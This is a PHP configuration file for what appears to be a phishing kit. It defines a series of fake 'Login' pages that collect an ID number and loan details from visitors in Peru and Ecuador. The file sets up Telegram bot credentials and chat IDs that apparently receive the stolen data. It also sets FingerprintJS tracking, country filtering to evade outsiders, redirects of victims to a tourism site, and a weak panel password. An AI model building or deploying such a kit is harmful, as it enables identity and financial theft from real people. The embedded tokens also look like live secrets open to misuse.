<?php
#error_reporting(0);

########################################################################
# BASE DE DATOS
########################################################################

$db_user = "";
$db_pass = "";
$db_host = "";
$db_name = "";

########################################################################
# FINGERPRINT JS
########################################################################

$fingerprintjs_key = "3UL13dh7nfBsBISAe5ew";

########################################################################
# NOMBRE DE ARCHIVOS Y TITULOS
########################################################################

$directory_guide = array(
	"ingresando_dni" => array(
		"titulo" => "Login",
		"nombre" => "one.php"
	),
	"step_two" => array(
		"titulo" => "Login",
		"nombre" => "step_two.php"
	),
	"step_tre" => array(
		"titulo" => "Login",
		"nombre" => "step_tre.php"
	),
	"monto_ingresado" => array(
		"titulo" => "Login",
		"nombre" => "step_four.php"
	),
	"confirmacion_prestamo" => array(
		"titulo" => "Login",
		"nombre" => "step_five.php"
	),
	"step_five" => array(
		"titulo" => "Login",
		"nombre" => "step_five.php"
	),
	"step_six" => array(
		"titulo" => "Login",
		"nombre" => "step_six.php"
	),
	"step_seven" => array(
		"titulo" => "Login",
		"nombre" => "step_seven.php"
	),
	"step_eight" => array(
		"titulo" => "Login",
		"nombre" => "step_eight.php"
	),
	"step_eleven" => array(
		"titulo" => "Login",
		"nombre" => "step_eleven.php"
	),
	"login_ingresado" => array(
		"titulo" => "Login",
		"nombre" => "step_nine.php"
	)
);

########################################################################
# REDIRECT URL (CAMBIAR TAMBIEN EN HTACCESS)
########################################################################

$redirect_final_url = "https://ecuador.travel";
$redirect_banned = "https://ecuador.travel";

########################################################################
# TELEGRAM CONFIG
########################################################################

$token = '1764470096:AAGQQdMTqT1N42TEZjJV_elbUjN44rYU4V8';
$chatIds_list = array("438952939", "741339622");

$detailed_log_mode = "si";

########################################################################
# ALLOWED COUNTRIES
########################################################################

$allowed_countries_list = array("PE", "EC");

########################################################################
# ALLOWED COUNTRIES
########################################################################

$panel_password = "pass123";

?>